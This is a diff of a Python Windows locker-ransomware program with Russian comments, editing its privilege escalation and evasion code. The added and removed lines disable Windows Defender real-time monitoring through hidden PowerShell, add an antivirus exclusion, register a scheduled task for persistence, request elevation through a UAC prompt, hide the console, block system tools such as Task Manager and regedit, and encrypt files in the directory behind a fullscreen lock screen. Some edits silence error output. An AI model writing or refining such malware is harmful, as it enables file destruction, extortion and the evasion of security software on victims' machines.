@@ -21,23 +21,23 @@ BLOKC_EXE = ["notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHac
 # ================= ОБХОД UAC И АНТИВИРУСА =================
 def elevate_and_evade():
     if not ctypes.windll.shell32.IsUserAnAdmin():
+        # Стандартный вызов UAC (синее окно). Если нажать Да - код получит права.
         try:
-            script = os.path.abspath(sys.argv[0])
-            subprocess.run(["schtasks", "/create", "/tn", "WinLocker", 
-                            "/tr", f'"{sys.executable}" "{script}"', 
-                            "/sc", "onlogon", "/rl", "highest", "/f"], 
-                           capture_output=True, shell=True)
-            subprocess.run(["schtasks", "/run", "/tn", "WinLocker"], 
-                           capture_output=True, shell=True)
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, " ".join(sys.argv), None, 1
+            )
         except:
             pass
         sys.exit(0)
 
+    # Если мы уже админ, тихо вырубаем Defender
     try:
-        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
-                        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;"
-                        "Add-MpPreference -ExclusionPath 'TestFolder' -ErrorAction SilentlyContinue"], 
-                       capture_output=True, creationflags=0x08000000)
+        subprocess.run(
+            ["powershell", "-WindowStyle", "Hidden", "-Command", 
+             "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
+             "Add-MpPreference -ExclusionPath 'TestFolder' -ErrorAction SilentlyContinue"],
+            capture_output=True, creationflags=0x08000000
+        )
     except:
         pass
 
@@ -59,7 +59,7 @@ def encrypt_file(filepath, key, iv):
         with open(filepath, "wb") as f:
             f.write(encrypted_data)
     except Exception as e:
-        print(f"Error {filepath}: {e}")
+        pass
 
 def encrypt_directory():
     base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
@@ -102,14 +102,18 @@ def resource_path(relative_path):
     except Exception:
         base_path = os.path.abspath(".")
     full_path = os.path.join(base_path, relative_path)
-    if not os.path.exists(full_path):
-        return None
-    return full_path
+    return full_path if os.path.exists(full_path) else None
 
 # ================= ИНТЕРФЕЙС =================
 def main():
     elevate_and_evade()
     
+    # Прячем консоль, если она открыта
+    try:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
     threading.Thread(target=start_blocking_loop, daemon=True).start()
     
     try:
@@ -138,7 +142,7 @@ def main():
             eye_label.image = eye_photo
             eye_label.place(relx=0.5, rely=0.45, anchor="center")
         except:
-            eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
+            eye_label = tk.Label(win, text="[Eye Error]", fg="red", bg="black")
             eye_label.place(relx=0.5, rely=0.45, anchor="center")
     else:
         eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
@@ -190,15 +194,13 @@ def main():
         for widget in win.winfo_children():
             widget.destroy()
             
-        # Звук при запуске локера
         try:
             sound_path = resource_path("scream.mp3")
             if sound_path:
                 winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
         except Exception as e:
-            print(f"Sound error: {e}")
+            pass
 
-        # Запуск шифрования
         threading.Thread(target=encrypt_directory, daemon=True).start()
 
         ss_path = resource_path("assets/s.png")
@@ -244,7 +246,6 @@ def main():
             if left > 0:
                 result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
             else:
-                # --- ФИНАЛЬНЫЙ ТЕКСТ И УБИЙСТВО EXPLORER.EXE ---
                 for widget in win.winfo_children():
                     widget.destroy()
                 
